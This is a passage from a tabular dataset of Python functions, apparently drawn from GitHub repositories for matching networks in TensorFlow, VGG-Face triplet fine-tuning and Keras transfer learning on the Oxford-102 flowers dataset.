        for (sample_id, test_sample) in enumerate(self.data.get_test_batches(total_batches=total_test_batches, augment_images=False)):
            (support_set_images, target_set_image, support_set_labels, target_set_label) = test_sample
            (c_loss_value, acc) = sess.run([self.losses[self.one_shot_omniglot.classify], self.losses[self.one_shot_omniglot.dn]], feed_dict={self.dropout_rate: self.args.dropout_rate_value, self.support_set_images: support_set_images[0], self.support_set_labels: support_set_labels[0], self.target_image: target_set_image[0], self.target_label: target_set_label[0], self.training_phase: False, self.learning_rate: self.current_learning_rate})
            iter_out = 'test_loss: {}, test_accuracy: {}'.format(c_loss_value, acc)
            pbar.set_description(iter_out)
            pbar.update(1)
            total_test_c_loss.append(c_loss_value)
            total_test_accuracy.append(acc)
    total_test_c_loss_mean = np.mean(total_test_c_loss)
    total_test_c_loss_std = np.std(total_test_c_loss)
    total_test_accuracy_mean = np.mean(total_test_accuracy)
    total_test_accuracy_std = np.std(total_test_accuracy)
    return (total_test_c_loss_mean, total_test_c_loss_std, total_test_accuracy_mean, total_test_accuracy_std)"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, name, layer_sizes, batch_size):
    """"""
        Initializes a multi layer bidirectional LSTM
        :param layer_sizes: A list containing the neuron numbers per layer e.g. [100, 100, 100] returns a 3 layer, 100
                                                                                                        neuron bid-LSTM
        :param batch_size: The experiments batch size
        """"""
    self.reuse = False
    self.batch_size = batch_size
    self.layer_sizes = layer_sizes
    self.name = name"
AntreasAntoniou/MatchingNetworks,__call__,"def __call__(self, inputs, training=False):
    """"""
        Runs the bidirectional LSTM, produces outputs and saves both forward and backward states as well as gradients.
        :param inputs: The inputs should be a list of shape [sequence_length, batch_size, 64]
        :param name: Name to give to the tensorflow op
        :param training: Flag that indicates if this is a training or evaluation stage
        :return: Returns the LSTM outputs, as well as the forward and backward hidden states.
        """"""
    with tf.variable_scope(self.name, reuse=self.reuse):
        with tf.variable_scope('encoder'):
            fw_lstm_cells_encoder = [rnn.LSTMCell(num_units=self.layer_sizes[i], activation=tf.nn.tanh) for i in range(len(self.layer_sizes))]
            bw_lstm_cells_encoder = [rnn.LSTMCell(num_units=self.layer_sizes[i], activation=tf.nn.tanh) for i in range(len(self.layer_sizes))]
            (outputs, output_state_fw, output_state_bw) = rnn.stack_bidirectional_rnn(fw_lstm_cells_encoder, bw_lstm_cells_encoder, inputs, dtype=tf.float32)
        print('g out shape', tf.stack(outputs, axis=1).get_shape().as_list())
    self.reuse = True
    self.variables = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope=self.name)
    return outputs"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, name, layer_size, batch_size):
    """"""
        Initializes a multi layer bidirectional LSTM
        :param layer_sizes: A list containing the neuron numbers per layer e.g. [100, 100, 100] returns a 3 layer, 100
                                                                                                        neuron bid-LSTM
        :param batch_size: The experiments batch size
        """"""
    self.reuse = False
    self.batch_size = batch_size
    self.layer_size = layer_size
    self.name = name"
AntreasAntoniou/MatchingNetworks,__call__,"def __call__(self, support_set_embeddings, target_set_embeddings, K, training=False):
    """"""
        Runs the bidirectional LSTM, produces outputs and saves both forward and backward states as well as gradients.
        :param inputs: The inputs should be a list of shape [sequence_length, batch_size, 64]
        :param name: Name to give to the tensorflow op
        :param training: Flag that indicates if this is a training or evaluation stage
        :return: Returns the LSTM outputs, as well as the forward and backward hidden states.
        """"""
    (b, k, h_g_dim) = support_set_embeddings.get_shape().as_list()
    (b, h_f_dim) = target_set_embeddings.get_shape().as_list()
    with tf.variable_scope(self.name, reuse=self.reuse):
        fw_lstm_cells_encoder = rnn.LSTMCell(num_units=self.layer_size, activation=tf.nn.tanh)
        attentional_softmax = tf.ones(shape=(b, k)) * (1.0 / k)
        h = tf.zeros(shape=(b, h_g_dim))
        c_h = (h, h)
        c_h = (c_h[0], c_h[1] + target_set_embeddings)
        for i in range(K):
            attentional_softmax = tf.expand_dims(attentional_softmax, axis=2)
            attented_features = support_set_embeddings * attentional_softmax
            attented_features_summed = tf.reduce_sum(attented_features, axis=1)
            c_h = (c_h[0], c_h[1] + attented_features_summed)
            (x, h_c) = fw_lstm_cells_encoder(inputs=target_set_embeddings, state=c_h)
            attentional_softmax = tf.layers.dense(x, units=k, activation=tf.nn.softmax, reuse=self.reuse)
            self.reuse = True
    outputs = x
    print('out shape', tf.stack(outputs, axis=0).get_shape().as_list())
    self.reuse = True
    self.variables = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope=self.name)
    print(self.variables)
    return outputs"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self):
    self.reuse = False"
AntreasAntoniou/MatchingNetworks,__call__,"def __call__(self, support_set, input_image, name, training=False):
    """"""
        This module calculates the cosine distance between each of the support set embeddings and the target
        image embeddings.
        :param support_set: The embeddings of the support set images, tensor of shape [sequence_length, batch_size, 64]
        :param input_image: The embedding of the target image, tensor of shape [batch_size, 64]
        :param name: Name of the op to appear on the graph
        :param training: Flag indicating training or evaluation (True/False)
        :return: A tensor with cosine similarities of shape [batch_size, sequence_length, 1]
        """"""
    with tf.name_scope('distance-module' + name), tf.variable_scope('distance-module', reuse=self.reuse):
        eps = 1e-10
        similarities = []
        for support_image in tf.unstack(support_set, axis=0):
            sum_support = tf.reduce_sum(tf.square(support_image), 1, keep_dims=True)
            support_magnitude = tf.rsqrt(tf.clip_by_value(sum_support, eps, float('inf')))
            dot_product = tf.matmul(tf.expand_dims(input_image, 1), tf.expand_dims(support_image, 2))
            dot_product = tf.squeeze(dot_product, [1])
            cosine_similarity = dot_product * support_magnitude
            similarities.append(cosine_similarity)
    similarities = tf.concat(axis=1, values=similarities)
    self.variables = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope='distance-module')
    return similarities"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self):
    self.reuse = False"
AntreasAntoniou/MatchingNetworks,__call__,"def __call__(self, similarities, support_set_y, name, training=False):
    """"""
        Produces pdfs over the support set classes for the target set image.
        :param similarities: A tensor with cosine similarities of size [sequence_length, batch_size, 1]
        :param support_set_y: A tensor with the one hot vectors of the targets for each support set image
                                                                            [sequence_length,  batch_size, num_classes]
        :param name: The name of the op to appear on tf graph
        :param training: Flag indicating training or evaluation stage (True/False)
        :return: Softmax pdf
        """"""
    with tf.name_scope('attentional-classification' + name), tf.variable_scope('attentional-classification', reuse=self.reuse):
        preds = tf.squeeze(tf.matmul(tf.expand_dims(similarities, 1), support_set_y))
    self.variables = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope='attentional-classification')
    return preds"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, name, batch_size, layer_sizes, num_channels=1):
    """"""
        Builds a CNN to produce embeddings
        :param batch_size: Batch size for experiment
        :param layer_sizes: A list of length 4 containing the layer sizes
        :param num_channels: Number of channels of images
        """"""
    self.reuse = False
    self.name = name
    self.batch_size = batch_size
    self.num_channels = num_channels
    self.layer_sizes = layer_sizes
    assert len(self.layer_sizes) == 4, 'layer_sizes should be a list of length 4'"
AntreasAntoniou/MatchingNetworks,__call__,"def __call__(self, image_input, training=False, dropout_rate=0.0):
    """"""
        Runs the CNN producing the embeddings and the gradients.
        :param image_input: Image input to produce embeddings for. [batch_size, 28, 28, 1]
        :param training: A flag indicating training or evaluation
        :param dropout_rate: A tf placeholder of type tf.float32 indicating the amount of dropout applied
        :return: Embeddings of size [batch_size, 64]
        """"""
    with tf.variable_scope(self.name, reuse=self.reuse):
        outputs = image_input
        with tf.variable_scope('conv_layers'):
            for (idx, num_filters) in enumerate(self.layer_sizes):
                with tf.variable_scope('g_conv_{}'.format(idx)):
                    if idx == len(self.layer_sizes) - 1:
                        outputs = tf.layers.conv2d(outputs, num_filters, [2, 2], strides=(1, 1), padding='VALID')
                    else:
                        outputs = tf.layers.conv2d(outputs, num_filters, [3, 3], strides=(1, 1), padding='VALID')
                    outputs = leaky_relu(outputs)
                    outputs = tf.contrib.layers.batch_norm(outputs, updates_collections=None, decay=0.99, scale=True, center=True, is_training=training)
                    outputs = max_pool(outputs, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME')
        image_embedding = tf.contrib.layers.flatten(outputs)
    self.reuse = True
    self.variables = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope=self.name)
    return image_embedding"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, support_set_images, support_set_labels, target_image, target_label, dropout_rate, batch_size=100, num_channels=1, is_training=False, learning_rate=0.001, fce=False, full_context_unroll_k=5, num_classes_per_set=5, num_samples_per_class=1, average_per_class_embeddings=False):
    """"""
        Builds a matching network, the training and evaluation ops as well as data augmentation routines.
        :param support_set_images: A tensor containing the support set images [batch_size, sequence_size, 28, 28, 1]
        :param support_set_labels: A tensor containing the support set labels [batch_size, sequence_size, 1]
        :param target_image: A tensor containing the target image (image to produce label for) [batch_size, 28, 28, 1]
        :param target_label: A tensor containing the target label [batch_size, 1]
        :param dropout_rate: A tf placeholder of type tf.float32 denotes the amount of dropout to be used
        :param batch_size: The batch size for the experiment
        :param num_channels: Number of channels of the images
        :param is_training: Flag indicating whether we are training or evaluating
        :param rotate_flag: Flag indicating whether to rotate the images
        :param fce: Flag indicating whether to use full context embeddings (i.e. apply an LSTM on the CNN embeddings)
        :param num_classes_per_set: Integer indicating the number of classes per set
        :param num_samples_per_class: Integer indicating the number of samples per class
        """"""
    self.batch_size = batch_size
    self.fce = fce
    self.classifier = Classifier(name='classifier_net', batch_size=self.batch_size, num_channels=num_channels, layer_sizes=[64, 64, 64, 64])
    if fce:
        self.g_lstm = g_embedding_bidirectionalLSTM(name='g_lstm', layer_sizes=[32], batch_size=self.batch_size)
        self.f_lstm = f_embedding_bidirectionalLSTM(name='f_attlstm', layer_size=64, batch_size=self.batch_size)
    self.dn = DistanceNetwork()
    self.classify = AttentionalClassify()
    self.full_context_K = full_context_unroll_k
    self.support_set_images = support_set_images
    self.support_set_labels = support_set_labels
    self.average_per_class_embeddings = average_per_class_embeddings
    self.target_image = target_image
    self.target_label = target_label
    self.dropout_rate = dropout_rate
    self.is_training = is_training
    self.num_classes_per_set = num_classes_per_set
    self.num_samples_per_class = num_samples_per_class
    self.learning_rate = learning_rate"
AntreasAntoniou/MatchingNetworks,loss,"def loss(self):
    """"""
        Builds tf graph for Matching Networks, produces losses and summary statistics.
        :return:
        """"""
    with tf.name_scope('losses'):
        [b, num_classes, spc] = self.support_set_labels[0].get_shape().as_list()
        self.support_set_labels = tf.reshape(self.support_set_labels[0], shape=(b, num_classes * spc))
        self.support_set_labels = tf.one_hot(self.support_set_labels, self.num_classes_per_set)
        g_encoded_images = []
        [b, num_classes, spc, h, w, c] = self.support_set_images[0].get_shape().as_list()
        self.support_set_images = tf.reshape(self.support_set_images[0], shape=(b, num_classes * spc, h, w, c))
        for image in tf.unstack(self.support_set_images, axis=1):
            support_set_cnn_embed = self.classifier(image_input=image, training=self.is_training, dropout_rate=self.dropout_rate)
            g_encoded_images.append(support_set_cnn_embed)
        if self.average_per_class_embeddings:
            g_encoded_images = tf.stack(g_encoded_images, axis=1)
            (b, k, h) = g_encoded_images.get_shape().as_list()
            g_encoded_images = tf.reshape(shape=(b, num_classes, spc, h))
            g_encoded_images = tf.reduce_mean(g_encoded_images, axis=2)
            self.support_set_labels = tf.reshape(self.support_set_labels, shape=(b, num_classes, spc, self.num_classes_per_set))
            self.support_set_labels = tf.reduce_mean(self.support_set_labels, axis=2)
        target_image = self.target_image[0]
        f_encoded_image = self.classifier(image_input=target_image, training=self.is_training, dropout_rate=self.dropout_rate)
        if self.fce:
            g_encoded_images = self.g_lstm(g_encoded_images, training=self.is_training)
            f_encoded_image = self.f_lstm(support_set_embeddings=tf.stack(g_encoded_images, axis=1), K=self.full_context_K, target_set_embeddings=f_encoded_image, training=self.is_training)
        g_encoded_images = tf.stack(g_encoded_images, axis=0)
        similarities = self.dn(support_set=g_encoded_images, input_image=f_encoded_image, name='distance_calculation', training=self.is_training)
        preds = self.classify(similarities, support_set_y=self.support_set_labels, name='classify', training=self.is_training)
        correct_prediction = tf.equal(tf.argmax(preds, 1), tf.cast(self.target_label[0], tf.int64))
        accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
        targets = tf.one_hot(self.target_label[0], self.num_classes_per_set)
        crossentropy_loss = self.crossentropy_softmax(targets=targets, outputs=preds)
        tf.add_to_collection('crossentropy_losses', crossentropy_loss)
        tf.add_to_collection('accuracy', accuracy)
    return {self.classify: tf.add_n(tf.get_collection('crossentropy_losses'), name='total_classification_loss'), self.dn: tf.add_n(tf.get_collection('accuracy'), name='accuracy')}"
AntreasAntoniou/MatchingNetworks,train,"def train(self, losses):
    """"""
        Builds the train op
        :param losses: A dictionary containing the losses
        :param learning_rate: Learning rate to be used for Adam
        :param beta1: Beta1 to be used for Adam
        :return:
        """"""
    c_opt = tf.train.AdamOptimizer(beta1=0.9, learning_rate=self.learning_rate)
    update_ops = tf.get_collection(tf.GraphKeys.UPDATE_OPS)
    with tf.control_dependencies(update_ops):
        if self.fce:
            train_variables = self.f_lstm.variables + self.g_lstm.variables + self.classifier.variables
        else:
            train_variables = self.classifier.variables
        c_error_opt_op = c_opt.minimize(losses[self.classify], var_list=train_variables, colocate_gradients_with_ops=True)
    return c_error_opt_op"
AntreasAntoniou/MatchingNetworks,crossentropy_softmax,"def crossentropy_softmax(self, outputs, targets):
    normOutputs = outputs - tf.reduce_max(outputs, axis=-1)[:, None]
    logProb = normOutputs - tf.log(tf.reduce_sum(tf.exp(normOutputs), axis=-1)[:, None])
    return -tf.reduce_mean(tf.reduce_sum(targets * logProb, axis=1))"
AntreasAntoniou/MatchingNetworks,init_train,"def init_train(self):
    """"""
        Get all ops, as well as all losses.
        :return:
        """"""
    losses = self.loss()
    c_error_opt_op = self.train(losses)
    summary = tf.summary.merge_all()
    return (summary, losses, c_error_opt_op)"
AntreasAntoniou/MatchingNetworks,get_args,"def get_args():
    parser = argparse.ArgumentParser(description='Welcome to the DAGAN training and inference system')
    parser.add_argument('--batch_size', nargs='?', type=int, default=32, help='Batch_size for experiment')
    parser.add_argument('--experiment_title', nargs='?', type=str, default='experiment-title', help='Experiment name')
    parser.add_argument('--continue_from_epoch', nargs='?', type=int, default=-1, help='Continue from checkpoint of epoch')
    parser.add_argument('--dropout_rate_value', type=float, default=0.3, help='Dropout_rate_value')
    parser.add_argument('--total_epochs', type=int, default=200, help='Number of epochs per experiment')
    parser.add_argument('--total_iter_per_epoch', type=int, default=1000, help='Number of iters per epoch')
    parser.add_argument('--full_context_unroll_k', type=int, default=5, help='Unroll levels K for attLSTM, used only when use_full_context_embeddings is set to True')
    parser.add_argument('--classes_per_set', type=int, default=5, help='Number of classes to sample per set')
    parser.add_argument('--samples_per_class', type=int, default=5, help='Number of samples per set to sample')
    parser.add_argument('--use_full_context_embeddings', type=str, default='False', help='Whether to use full context embeddings (i.e. bidirLSTM for g_embed and attLSTM for f_embed)')
    parser.add_argument('--use_mean_per_class_embeddings', type=str, default='False', help='Whether to take the mean ofthe CNN embeddings classwise (i.e. produce one embedding per class, similar to prototypical networks paper)')
    args = parser.parse_args()
    args.use_full_context_embeddings = True if args.use_full_context_embeddings == 'True' else False
    args.use_mean_per_class_embeddings = True if args.use_mean_per_class_embeddings == 'True' else False
    return args"
AntreasAntoniou/MatchingNetworks,save_statistics,"def save_statistics(log_path, line_to_add, log_name='experiment_log.csv', create=False):
    if create:
        with open('{}/{}'.format(log_path, log_name), 'w+') as f:
            writer = csv.writer(f)
            writer.writerow(line_to_add)
    else:
        with open('{}/{}'.format(log_path, log_name), 'a') as f:
            writer = csv.writer(f)
            writer.writerow(line_to_add)"
AntreasAntoniou/MatchingNetworks,load_statistics,"def load_statistics(log_path, log_name='experiment_log'):
    data_dict = dict()
    with open('{}/{}'.format(log_path, log_name), 'r') as f:
        lines = f.readlines()
        data_labels = lines[0].replace('\n', '').split(',')
        del lines[0]
        for label in data_labels:
            data_dict[label] = []
        for line in lines:
            data = line.replace('\n', '').split(',')
            for (key, item) in zip(data_labels, data):
                data_dict[key].append(item)
    return data_dict"
AntreasAntoniou/MatchingNetworks,build_experiment_folder,"def build_experiment_folder(experiment_name):
    saved_models_filepath = '{}/{}'.format(experiment_name, 'saved_models')
    logs_filepath = '{}/{}'.format(experiment_name, 'logs')
    import os
    if not os.path.exists(experiment_name):
        os.makedirs(experiment_name)
    if not os.path.exists(logs_filepath):
        os.makedirs(logs_filepath)
    if not os.path.exists(saved_models_filepath):
        os.makedirs(saved_models_filepath)
    return (saved_models_filepath, logs_filepath)"
Ao-Lee/Vgg-Face-Fine-tune,_CountFiles,"def _CountFiles(root):
    count = 0
    subfolders = [join(root, subfolder) for subfolder in listdir(root)]
    mask = [isdir(subfolder) for subfolder in subfolders]
    count = len(subfolders) - np.sum(mask)
    subfolders = np.array(subfolders)[mask]
    for subfolder in subfolders:
        count += _CountFiles(subfolder)
    return count"
Ao-Lee/Vgg-Face-Fine-tune,_ReadAndResize,"def _ReadAndResize(filepath):
    im = Image.open(filepath).convert('RGB')
    im = im.resize((cfg.image_size, cfg.image_size))
    return np.array(im, dtype='float32')"
Ao-Lee/Vgg-Face-Fine-tune,_Flip,"def _Flip(im_array):
    if np.random.uniform(0, 1) > 0.7:
        im_array = np.fliplr(im_array)
    return im_array"
Ao-Lee/Vgg-Face-Fine-tune,TripletGenerator,"def TripletGenerator(reader):
    while True:
        list_pos = []
        list_anchor = []
        list_neg = []
        for _ in range(cfg.batch_size):
            (path_anchor, path_pos, path_neg) = reader.GetTriplet()
            img_anchor = _Flip(_ReadAndResize(path_anchor))
            img_pos = _Flip(_ReadAndResize(path_pos))
            img_neg = _Flip(_ReadAndResize(path_neg))
            list_pos.append(img_pos)
            list_anchor.append(img_anchor)
            list_neg.append(img_neg)
        A = preprocess_input(np.array(list_anchor))
        P = preprocess_input(np.array(list_pos))
        N = preprocess_input(np.array(list_neg))
        label = None
        yield ({'anchor_input': A, 'positive_input': P, 'negative_input': N}, label)"
Ao-Lee/Vgg-Face-Fine-tune,_ShowImg,"def _ShowImg(img):
    plt.figure()
    plt.imshow(img.astype('uint8'))
    plt.show()
    plt.close()"
Ao-Lee/Vgg-Face-Fine-tune,_TestTripletGenerator,"def _TestTripletGenerator(reader):
    gen = TripletGenerator(reader)
    data = next(gen)
    imgs_anchor = data[0]['anchor_input']
    imgs_pos = data[0]['positive_input']
    imgs_neg = data[0]['negative_input']
    print(imgs_anchor.shape)
    print(imgs_pos.shape)
    print(imgs_neg.shape)
    imgs_anchor = imgs_anchor.transpose([0, 2, 3, 1])
    imgs_pos = imgs_pos.transpose([0, 2, 3, 1])
    imgs_neg = imgs_neg.transpose([0, 2, 3, 1])
    for idx_img in range(cfg.batch_size):
        anchor = imgs_anchor[idx_img]
        pos = imgs_pos[idx_img]
        neg = imgs_neg[idx_img]
        print(anchor.shape)
        print(pos.shape)
        print(neg.shape)
        _ShowImg(anchor)
        _ShowImg(pos)
        _ShowImg(neg)
        break
    print('data size is {}'.format(reader.GetDataSize()))"
Ao-Lee/Vgg-Face-Fine-tune,TestLFW,"def TestLFW():
    reader = LFWReader(dir_images=cfg.path_LFW)
    _TestTripletGenerator(reader)"
Ao-Lee/Vgg-Face-Fine-tune,TestARFace,"def TestARFace():
    reader = ARFaceReader(dir_images=cfg.path_AR)
    _TestTripletGenerator(reader)"
Ao-Lee/Vgg-Face-Fine-tune,TestPCD,"def TestPCD():
    reader = PCDReader(dir_images=cfg.path_PCD)
    _TestTripletGenerator(reader)"
Ao-Lee/Vgg-Face-Fine-tune,TestPEAL,"def TestPEAL():
    reader2 = PEALReader(dir_images=cfg.path_Accessory)
    _TestTripletGenerator(reader2)"
Ao-Lee/Vgg-Face-Fine-tune,TestMix,"def TestMix():
    reader_PCD = PCDReader(dir_images=cfg.path_PCD)
    reader_AR = ARFaceReader(dir_images=cfg.path_AR)
    reader_LFW = LFWReader(dir_images=cfg.path_LFW)
    reader_Pose = PEALReader(dir_images=cfg.path_Pose)
    reader_Accessory = PEALReader(dir_images=cfg.path_Accessory)
    reader = MixedReader([reader_PCD, reader_AR, reader_LFW, reader_Pose, reader_Accessory])
    _TestTripletGenerator(reader)"
Ao-Lee/Vgg-Face-Fine-tune,__init__,"def __init__(self, dir_images):
    self.root = dir_images
    self.data_size = _CountFiles(self.root)"
Ao-Lee/Vgg-Face-Fine-tune,GetTriplet,"@abstractmethod
def GetTriplet(self):
    pass"
Ao-Lee/Vgg-Face-Fine-tune,GetDataSize,"def GetDataSize(self):
    return self.data_size"
Ao-Lee/Vgg-Face-Fine-tune,__init__,"def __init__(self, dir_images):
    super().__init__(dir_images)
    paths = os.listdir(self.root)
    paths = [join(self.root, path) for path in paths]
    self.num_class = len(paths)
    self.num_per_person = [len(os.listdir(path)) for path in paths]"
Ao-Lee/Vgg-Face-Fine-tune,CreateName,"@staticmethod
def CreateName(root, personID, imageID):
    p = '%03d' % personID
    i = '%02d' % imageID + '.jpg'
    return join(root, p, i)"
Ao-Lee/Vgg-Face-Fine-tune,GetTriplet,"def GetTriplet(self):
    (path_anchor, path_pos, path_neg) = ('', '', '')
    idx_person_pos = np.random.randint(low=0, high=self.num_class)
    L = self.num_per_person
    while not exists(path_anchor):
        idx_img_anchor = np.random.randint(low=0, high=L[idx_person_pos])
        path_anchor = PCDReader.CreateName(self.root, idx_person_pos, idx_img_anchor)
    idx_img_pos = -1
    while not exists(path_pos) or idx_img_pos == idx_img_anchor:
        idx_img_pos = np.random.randint(low=0, high=L[idx_person_pos])
        path_pos = PCDReader.CreateName(self.root, idx_person_pos, idx_img_pos)
    idx_person_neg = -1
    while not exists(path_neg) or idx_person_neg == idx_person_pos:
        idx_person_neg = np.random.randint(low=0, high=self.num_class)
        idx_img_neg = np.random.randint(low=0, high=L[idx_person_neg])
        path_neg = PCDReader.CreateName(self.root, idx_person_neg, idx_img_neg)
    return (path_anchor, path_pos, path_neg)"
Ao-Lee/Vgg-Face-Fine-tune,__init__,"def __init__(self, dir_images):
    super().__init__(dir_images)
    paths = os.listdir(self.root)
    self.dir_sex_list = [path[:1] for path in paths]
    paths = [join(self.root, path) for path in paths]
    self.dir = paths
    self.num_class = len(paths)
    self.num_per_person = [len(os.listdir(path)) for path in paths]"
Ao-Lee/Vgg-Face-Fine-tune,CreateName,"@staticmethod
def CreateName(root, dir, imageID):
    files = [file for file in os.listdir(dir)]
    return dir + '\\' + files[imageID]"
Ao-Lee/Vgg-Face-Fine-tune,GetTriplet,"def GetTriplet(self):
    (path_anchor, path_pos, path_neg) = ('', '', '')
    idx_sex = 'M' if np.random.random() > 0.5 else 'F'
    dir_sex = ''
    while idx_sex != dir_sex:
        idx_person_pos = np.random.randint(low=0, high=self.num_class)
        dir = self.dir[idx_person_pos]
        dir_sex = self.dir_sex_list[idx_person_pos]
    L = self.num_per_person
    for file in os.listdir(dir):
        if file[2:8] == 'NORMAL':
            path_anchor = dir + '\\' + file
    while not exists(path_anchor):
        idx_img_anchor = np.random.randint(low=0, high=L[idx_person_pos])
        path_anchor = PEALReader.CreateName(self.root, dir, idx_img_anchor)
    while not exists(path_pos) or path_anchor == path_pos:
        idx_img_pos = np.random.randint(low=0, high=L[idx_person_pos])
        path_pos = PEALReader.CreateName(self.root, dir, idx_img_pos)
    idx_person_neg = -1
    while not exists(path_neg) or idx_person_neg == idx_person_pos or self.dir_sex_list[idx_person_neg] != idx_sex:
        idx_person_neg = np.random.randint(low=0, high=self.num_class)
        idx_img_neg = np.random.randint(low=0, high=L[idx_person_neg])
        path_neg = PEALReader.CreateName(self.root, self.dir[idx_person_neg], idx_img_neg)
    return (path_anchor, path_pos, path_neg)"
Ao-Lee/Vgg-Face-Fine-tune,CreateName,"@staticmethod
def CreateName(root, sex, personID, imageID):
    name = sex + '-' + '%03d' % personID + '-' + '%02d' % imageID
    name = name + '.bmp'
    return join(root, name)"
Ao-Lee/Vgg-Face-Fine-tune,GetTriplet,"def GetTriplet(self):
    (path_anchor, path_pos, path_neg) = ('', '', '')
    idx_sex = 'M' if np.random.random() > 0.5 else 'W'
    while not exists(path_anchor):
        idx_person_pos = np.random.randint(low=1, high=51)
        path_anchor = ARFaceReader.CreateName(self.root, idx_sex, idx_person_pos, 1)
    while not exists(path_pos):
        idx_img_pos = np.random.randint(low=2, high=27)
        path_pos = ARFaceReader.CreateName(self.root, idx_sex, idx_person_pos, idx_img_pos)
    idx_person_neg = 0
    while not exists(path_neg) or idx_person_neg == idx_person_pos:
        idx_person_neg = np.random.randint(low=1, high=51)
        idx_img_neg = np.random.randint(low=1, high=27)
        path_neg = ARFaceReader.CreateName(self.root, idx_sex, idx_person_neg, idx_img_neg)
    return (path_anchor, path_pos, path_neg)"
Ao-Lee/Vgg-Face-Fine-tune,__init__,"def __init__(self, dir_images):
    super().__init__(dir_images)
    self.list_classes = os.listdir(self.root)
    self.not_single = [c for c in self.list_classes if len(listdir(join(self.root, c))) > 1]
    self.list_classes_idx = range(len(self.list_classes))
    self.not_single_idx = range(len(self.not_single))
    self.weights_not_single = [len(listdir(join(self.root, c))) for c in self.not_single]
    self.weights_not_single = np.array(self.weights_not_single)
    self.weights_not_single = self.weights_not_single / np.sum(self.weights_not_single)
    self.weights = [len(listdir(join(self.root, c))) for c in self.list_classes]
    self.weights = np.array(self.weights)
    self.weights = self.weights / np.sum(self.weights)"
Ao-Lee/Vgg-Face-Fine-tune,GetTriplet,"def GetTriplet(self):
    idx_class_pos = np.random.choice(self.not_single_idx, 1, p=self.weights_not_single)[0]
    name_pos = self.not_single[idx_class_pos]
    dir_pos = join(self.root, name_pos)
    [idx_img_anchor, idx_img_pos] = np.random.choice(range(len(listdir(dir_pos))), 2, replace=False)
    while True:
        idx_class_neg = np.random.choice(self.list_classes_idx, 1, p=self.weights)[0]
        if idx_class_neg != idx_class_pos:
            break
    name_neg = self.list_classes[idx_class_neg]
    dir_neg = join(self.root, name_neg)
    idx_img_neg = np.random.choice(range(len(listdir(dir_neg))), 1)[0]
    idx_img_anchor += 1
    idx_img_pos += 1
    idx_img_neg += 1
    path_anchor = join(dir_pos, name_pos + '_' + '%04d' % idx_img_anchor + '.jpg')
    path_pos = join(dir_pos, name_pos + '_' + '%04d' % idx_img_pos + '.jpg')
    path_neg = join(dir_neg, name_neg + '_' + '%04d' % idx_img_neg + '.jpg')
    return (path_anchor, path_pos, path_neg)"
Ao-Lee/Vgg-Face-Fine-tune,__init__,"def __init__(self, list_readers):
    self.readers = list_readers"
Ao-Lee/Vgg-Face-Fine-tune,GetTriplet,"def GetTriplet(self):
    sizes = np.array([reader.GetDataSize() for reader in self.readers])
    p = sizes / np.sum(sizes)
    idx = np.random.choice(range(len(self.readers)), size=1, p=p)[0]
    (path_anchor, path_pos, path_neg) = self.readers[idx].GetTriplet()
    return (path_anchor, path_pos, path_neg)"
Ao-Lee/Vgg-Face-Fine-tune,GetDataSize,"def GetDataSize(self):
    return np.sum([reader.GetDataSize() for reader in self.readers])"
Arsey/keras-transfer-learning-for-oxford102,download_file,"def download_file(url, dest=None):
    if not dest:
        dest = os.path.join(data_path, url.split('/')[-1])
    urlretrieve(url, dest)"
Arsey/keras-transfer-learning-for-oxford102,move_files,"def move_files(dir_name, labels):
    cur_dir_path = os.path.join(config.data_dir, dir_name)
    if not os.path.exists(cur_dir_path):
        os.mkdir(cur_dir_path)
    for i in range(0, 102):
        class_dir = os.path.join(config.data_dir, dir_name, str(i))
        os.mkdir(class_dir)
    for label in labels:
        src = str(label[0])
        dst = os.path.join(cwd, config.data_dir, dir_name, label[1], src.split(os.sep)[-1])
        copyfile(src, dst)"
Arsey/keras-transfer-learning-for-oxford102,set_paths,"def set_paths():
    global train_dir, validation_dir
    train_dir = join_path(data_dir, 'train/')
    validation_dir = join_path(data_dir, 'valid/')"
Arsey/keras-transfer-learning-for-oxford102,get_top_model_weights_path,"def get_top_model_weights_path():
    return top_model_weights_path.format(model)"
Arsey/keras-transfer-learning-for-oxford102,get_fine_tuned_weights_path,"def get_fine_tuned_weights_path(checkpoint=False):
    return fine_tuned_weights_path.format(model + '-checkpoint' if checkpoint else model)"
Arsey/keras-transfer-learning-for-oxford102,get_novelty_detection_model_path,"def get_novelty_detection_model_path():
    return novelty_detection_model_path.format(model)"
Arsey/keras-transfer-learning-for-oxford102,get_model_path,"def get_model_path():
    return model_path.format(model)"
Arsey/keras-transfer-learning-for-oxford102,get_classes_path,"def get_classes_path():
    return classes_path.format(model)"
Arsey/keras-transfer-learning-for-oxford102,parse_args,"def parse_args():
    """"""
    Parse input arguments
    """"""
    parser = argparse.ArgumentParser()
    parser.add_argument('--path', dest='path', help='Path to image', default=None, type=str)
    parser.add_argument('--accuracy', action='store_true', help='To print accuracy score')
    parser.add_argument('--plot_confusion_matrix', action='store_true')
    parser.add_argument('--execution_time', action='store_true')
    parser.add_argument('--store_activations', action='store_true')
    parser.add_argument('--novelty_detection', action='store_true')
    parser.add_argument('--model', type=str, required=True, help='Base model architecture', choices=[config.MODEL_RESNET50, config.MODEL_RESNET152, config.MODEL_INCEPTION_V3, config.MODEL_VGG16])
    parser.add_argument('--data_dir', help='Path to data train directory')
    parser.add_argument('--batch_size', default=500, type=int, help='How many files to predict on at once')
    args = parser.parse_args()
    return args"
Arsey/keras-transfer-learning-for-oxford102,get_files,"def get_files(path):
    if os.path.isdir(path):
        files = glob.glob(path + '*.jpg')
    elif path.find('*') > 0:
        files = glob.glob(path)
    else:
        files = [path]
    if not len(files):
        print('No images found by the given path')
        exit(1)
    return files"
Arsey/keras-transfer-learning-for-oxford102,get_inputs_and_trues,"def get_inputs_and_trues(files):
    inputs = []
    y_true = []
    for i in files:
        x = model_module.load_img(i)
        try:
